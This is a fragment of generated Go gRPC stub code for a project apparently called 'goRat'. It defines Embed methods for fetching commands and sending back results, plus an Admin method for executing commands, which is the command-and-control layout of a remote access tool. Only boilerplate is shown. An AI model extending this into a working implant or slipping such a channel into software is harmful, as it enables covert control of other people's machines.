...
func (c *embedClient) GetCommand(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Command, error) {
	out := new(Command)
	err := c.cc.Invoke(ctx, "/goRat.Embed/GetCommand", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
...
func (c *embedClient) SendResult(ctx context.Context, in *Command, opts ...grpc.CallOption) (*Empty, error) {
	out := new(Empty)
	err := c.cc.Invoke(ctx, "/goRat.Embed/SendResult", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
...
func _Embed_GetCommand_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	...
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/goRat.Embed/GetCommand",
	}
...
func _Embed_SendResult_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	...
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/goRat.Embed/SendResult",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
...
func (c *adminClient) ExecuteCommand(ctx context.Context, in *Command, opts ...grpc.CallOption) (*Command, error) {
	out := new(Command)
	err := c.cc.Invoke(ctx, "/goRat.Admin/ExecuteCommand", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
...
func _Admin_ExecuteCommand_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	...
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/goRat.Admin/ExecuteCommand",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
